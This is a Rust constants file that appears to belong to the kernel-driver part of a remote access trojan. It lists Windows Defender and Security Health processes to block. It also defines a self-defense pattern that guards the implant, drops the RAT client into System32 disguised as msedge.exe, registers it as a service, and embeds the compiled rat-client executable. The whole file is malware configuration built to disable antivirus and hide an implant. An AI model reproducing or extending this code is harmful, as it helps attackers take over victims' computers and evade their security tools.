use const_format::formatcp;
use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
use widestring::{U16CStr, u16cstr};

pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;

/// Path to the registry key of the user-mode service.
pub const RAT_CLIENT_SERVICE_REGISTRY: &U16CStr = u16cstr!(formatcp!(
    "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\{RAT_CLIENT_SERVICE_NAME}"
));

/// Process block list.
pub const BLOCKED_PROCESS_PATTERN: &[&U16CStr] = &[
    // u16cstr!("System32\\smartscreen.exe"),
    u16cstr!("System32\\SecurityHealthService.exe"),
    // u16cstr!("Windows Defender\\MpCmdRun.exe"),
    u16cstr!("Windows Defender\\MsMpEng.exe"),
];

/// Self-defense pattern to construct the Aho-Corasick automaton.
///
/// The object callback protects against handle creation of any process whose image path
/// matches this pattern.
pub const USER_SERVICE_SD: &U16CStr = u16cstr!("System32\\msedge.exe");

/// Path to the file to be dropped during initialization.
pub const RAT_CLIENT_FILE_PATH: &U16CStr = u16cstr!("\\SystemRoot\\System32\\msedge.exe");

/// Path to the service executable - SCM must understand this path.
pub const RAT_CLIENT_SERVICE_PATH: &str = "%SystemRoot%\\System32\\msedge.exe";

/// Altitude for certain filtering operations.
pub const ALTITUDE: &U16CStr = u16cstr!("360000");

pub const DOS_NAME: &U16CStr = u16cstr!(formatcp!("\\DosDevices\\{RAT_CLIENT_SERVICE_NAME}"));
pub const DEVICE_NAME: &U16CStr = u16cstr!(formatcp!("\\Device\\{RAT_CLIENT_SERVICE_NAME}"));

#[cfg(debug_assertions)]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe");

#[cfg(not(debug_assertions))]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");
